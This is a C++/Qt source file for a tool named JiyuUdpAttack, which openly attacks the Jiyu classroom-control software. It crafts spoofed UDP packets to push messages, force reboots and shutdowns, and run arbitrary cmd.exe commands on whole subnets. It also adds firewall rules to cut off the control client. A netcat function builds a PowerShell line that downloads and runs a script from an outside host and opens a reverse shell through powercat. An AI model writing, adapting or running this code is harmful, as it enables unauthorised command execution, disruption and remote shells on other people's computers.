#include "jiyuudpattack.h"
#include <QCoreApplication>
#include <QHostInfo>
#include <QNetworkInterface>
#include <QProcess>
#include <QThread>
#include <QtEndian>
#include <random>

JiyuUdpAttack::JiyuUdpAttack(QObject *parent)
    : QObject(parent)
    , m_port(4705)
    , m_loopCount(1)
    , m_loopInterval(22)
{
    initPackets();
}

JiyuUdpAttack::~JiyuUdpAttack()
{
    m_socket.close();
}

void JiyuUdpAttack::initPackets()
{
    m_packets.resize(4);
    
    m_packets[PacketReboot] = QByteArray(1024, 0x00);
    QByteArray rebootHeader = QByteArray::fromHex(
        "444d4f43000001009e0300001041affba0e7524091dc27a3b6f9292e204e0000"
        "c0a850819103000091030000000800000000000005000000"
    );
    m_packets[PacketReboot].replace(0, rebootHeader.size(), rebootHeader);
    
    m_packets[PacketShutdown] = QByteArray(1024, 0x00);
    QByteArray shutdownHeader = QByteArray::fromHex(
        "444d4f43000001006e0300005b682b256f61644da792f04700c5a40e204e0000"
        "c0a86486610300006103000000020000000000000f000000"
        "0100000043003a005c00570069006e0064006f0077007300"
        "5c00730079007300740065006d00330032005c0063006d00"
        "64002e006500780065000000000000"
    );
    m_packets[PacketShutdown].replace(0, shutdownHeader.size(), shutdownHeader);
    
    m_packets[PacketMsg] = QByteArray(1024, 0x00);
    QByteArray msgHeader = QByteArray::fromHex(
        "444d4f43000001009e0300001041affba0e7524091dc27a3b6f9292e204e0000"
        "c0a850819103000091030000000800000000000005000000"
    );
    m_packets[PacketMsg].replace(0, msgHeader.size(), msgHeader);
    
    m_packets[PacketCmd] = QByteArray(2048, 0x00);
    QByteArray cmdHeader = QByteArray::fromHex(
        "444d4f43000001006e0300005b682b256f61644da792f04700c5a40e204e0000"
        "c0a86486610300006103000000020000000000000f000000"
        "0100000043003a005c00570069006e0064006f0077007300"
        "5c00730079007300740065006d00330032005c0063006d00"
        "64002e006500780065000000000000"
    );
    m_packets[PacketCmd].replace(0, cmdHeader.size(), cmdHeader);
}

void JiyuUdpAttack::setTargetIp(const QString &ip)
{
    m_targetIp = ip;
}

void JiyuUdpAttack::setPort(int port)
{
    m_port = port;
}

void JiyuUdpAttack::setLoopCount(int count)
{
    m_loopCount = count;
}

void JiyuUdpAttack::setLoopInterval(int interval)
{
    m_loopInterval = interval;
}

QStringList JiyuUdpAttack::parseIpAddress(const QString &ip)
{
    QStringList result;
    
    if (ip.contains('-')) {
        QStringList parts = ip.split('-');
        if (parts.size() == 2) {
            QString base = parts[0];
            int end = parts[1].toInt();
            
            QStringList baseParts = base.split('.');
            if (baseParts.size() == 4) {
                int start = baseParts[3].toInt();
                if (end > 254) end = 254;
                
                for (int i = start; i <= end; ++i) {
                    baseParts[3] = QString::number(i);
                    result.append(baseParts.join('.'));
                }
            }
        }
    } else if (ip.contains("/24")) {
        QString base = ip;
        base.replace("/24", "");
        QStringList baseParts = base.split('.');
        if (baseParts.size() == 4) {
            for (int i = 1; i <= 254; ++i) {
                baseParts[3] = QString::number(i);
                result.append(baseParts.join('.'));
            }
        }
    } else {
        result.append(ip);
    }
    
    return result;
}

QByteArray JiyuUdpAttack::formatMessage(const QString &content)
{
    QByteArray result;
    
    for (const QChar &ch : content) {
        ushort unicode = ch.unicode();
        if (unicode > 0xff) {
            result.append(static_cast<char>(unicode & 0xFF));
            result.append(static_cast<char>((unicode >> 8) & 0xFF));
        } else {
            result.append(static_cast<char>(unicode & 0xFF));
            result.append('\x00');
        }
    }
    
    return result;
}

QByteArray JiyuUdpAttack::buildPacket(PacketType type, const QByteArray &content)
{
    if (type == PacketMsg) {
        QByteArray packet = m_packets[PacketMsg];
        QByteArray formatted = formatMessage(content);
        
        int offset = 56;
        for (int i = 0; i < formatted.size() && offset < packet.size(); ++i, ++offset) {
            packet[offset] = formatted[i];
        }
        
        return packet;
    } else if (type == PacketCmd) {
        QByteArray packet = m_packets[PacketCmd];
        QByteArray formatted = formatMessage(content);
        
        int offset = 578;
        for (int i = 0; i < formatted.size() && offset < packet.size(); ++i, ++offset) {
            packet[offset] = formatted[i];
        }
        
        return packet;
    }
    
    return m_packets[type];
}

bool JiyuUdpAttack::sendUdpPacket(const QByteArray &packet, const QHostAddress &addr, int port)
{
    qint64 bytesSent = m_socket.writeDatagram(packet, addr, port);
    return bytesSent == packet.size();
}

bool JiyuUdpAttack::sendMessage(const QString &message)
{
    if (m_targetIp.isEmpty()) {
        emit errorOccurred("目标 IP 未设置");
        return false;
    }
    
    QStringList targets = parseIpAddress(m_targetIp);
    if (targets.isEmpty()) {
        emit errorOccurred("无效的 IP 地址");
        return false;
    }
    
    QByteArray packet = buildPacket(PacketMsg, message.toUtf8());
    
    for (int loop = 0; loop < m_loopCount; ++loop) {
        for (const QString &target : targets) {
            QHostAddress addr(target);
            if (sendUdpPacket(packet, addr, m_port)) {
                emit statusMessage(QString("已发送消息到 %1").arg(target));
            }
        }
        
        if (m_loopCount == 1) {
            emit statusMessage("发送成功");
            emit attackCompleted();
            return true;
        }
        
        emit statusMessage(QString("第%1次执行完毕").arg(loop + 1));
        
        if (loop != m_loopCount - 1) {
            QThread::sleep(static_cast<unsigned long>(m_loopInterval));
        }
    }
    
    emit attackCompleted();
    return true;
}

bool JiyuUdpAttack::executeCommand(const QString &command)
{
    if (m_targetIp.isEmpty()) {
        emit errorOccurred("目标 IP 未设置");
        return false;
    }
    
    QStringList targets = parseIpAddress(m_targetIp);
    if (targets.isEmpty()) {
        emit errorOccurred("无效的 IP 地址");
        return false;
    }
    
    QByteArray packet = buildPacket(PacketCmd, command.toUtf8());
    
    for (int loop = 0; loop < m_loopCount; ++loop) {
        for (const QString &target : targets) {
            QHostAddress addr(target);
            if (sendUdpPacket(packet, addr, m_port)) {
                emit statusMessage(QString("已发送命令到 %1").arg(target));
            }
        }
        
        if (m_loopCount == 1) {
            emit statusMessage("命令发送成功");
            emit attackCompleted();
            return true;
        }
        
        emit statusMessage(QString("第%1次执行完毕").arg(loop + 1));
        
        if (loop != m_loopCount - 1) {
            QThread::sleep(m_loopInterval);
        }
    }
    
    emit attackCompleted();
    return true;
}

bool JiyuUdpAttack::reboot()
{
    if (m_targetIp.isEmpty()) {
        emit errorOccurred("目标 IP 未设置");
        return false;
    }
    
    QStringList targets = parseIpAddress(m_targetIp);
    QByteArray packet = m_packets[PacketReboot];
    
    for (const QString &target : targets) {
        QHostAddress addr(target);
        sendUdpPacket(packet, addr, m_port);
    }
    
    emit statusMessage("重启命令已发送");
    emit attackCompleted();
    return true;
}

bool JiyuUdpAttack::shutdown()
{
    if (m_targetIp.isEmpty()) {
        emit errorOccurred("目标 IP 未设置");
        return false;
    }
    
    QStringList targets = parseIpAddress(m_targetIp);
    QByteArray packet = m_packets[PacketShutdown];
    
    for (const QString &target : targets) {
        QHostAddress addr(target);
        sendUdpPacket(packet, addr, m_port);
    }
    
    emit statusMessage("关机命令已发送");
    emit attackCompleted();
    return true;
}

void JiyuUdpAttack::getLocalInfo()
{
    QString hostname = QHostInfo::localHostName();
    QHostAddress address = QNetworkInterface::allAddresses().first();
    
    emit statusMessage(QString("Your IP address is: %1").arg(address.toString()));
    
    QProcess process;
    process.start("tasklist", QStringList() << "/FI" << "IMAGENAME eq StudentMain.exe" << "/FO" << "CSV" << "/NH");
    process.waitForFinished(3000);
    QString tasklist = process.readAllStandardOutput();
    
    emit statusMessage(QString("任务列表：%1").arg(tasklist));
    
    process.start("netstat", QStringList() << "-ano");
    process.waitForFinished(3000);
    QString netstat = process.readAllStandardOutput();
    
    emit statusMessage("网络状态信息已获取");
    emit attackCompleted();
}

void JiyuUdpAttack::breakControl()
{
    QProcess process;
    
    process.start("sc", QStringList() << "config" << "MpsSvc" << "start=" << "auto");
    process.waitForFinished(3000);
    
    process.start("net", QStringList() << "start" << "MpsSvc");
    process.waitForFinished(3000);
    
    process.start("netsh", QStringList() << "advfirewall" << "set" << "allprofiles" << "state" << "on");
    process.waitForFinished(3000);
    
    process.start("netsh", QStringList() << "advfirewall" << "firewall" << "set" << "rule" 
                 "name=StudentMain.exe" << "new" << "action=block");
    process.waitForFinished(3000);
    
    QThread::sleep(1000);
    
    emit statusMessage("屏幕控制已脱离");
    emit attackCompleted();
}

void JiyuUdpAttack::continueControl()
{
    QProcess process;
    
    process.start("netsh", QStringList() << "advfirewall" << "firewall" << "set" << "rule"
                 "name=StudentMain.exe" << "new" << "action=allow");
    process.waitForFinished(3000);
    
    emit statusMessage("屏幕控制已恢复");
    emit attackCompleted();
}

bool JiyuUdpAttack::netcat(int port)
{
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(1, 65535);
    
    int randomPort = port > 0 ? port : dis(gen);
    
    QHostAddress address = QNetworkInterface::allAddresses().first();
    
    QString cmd = QString("powershell IEX (New-Object System.Net.Webclient).DownloadString('https://xss.pt/hYvg');powercat -c %1 -p %2 -e cmd")
                      .arg(address.toString())
                      .arg(randomPort);
    
    emit statusMessage(QString("监听端口：%1").arg(randomPort));
    
    return executeCommand(cmd);
}

bool JiyuUdpAttack::attack(ExtraOption option)
{
    switch (option) {
    case OptionReboot:
        return reboot();
    case OptionShutdown:
        return shutdown();
    case OptionGetInfo:
        getLocalInfo();
        return true;
    case OptionBreak:
        breakControl();
        return true;
    case OptionContinue:
        continueControl();
        return true;
    default:
        emit errorOccurred("未知选项");
        return false;
    }
}

bool JiyuUdpAttack::attackWithMessage(const QString &message)
{
    return sendMessage(message);
}

bool JiyuUdpAttack::attackWithCommand(const QString &command)
{
    return executeCommand(command);
}
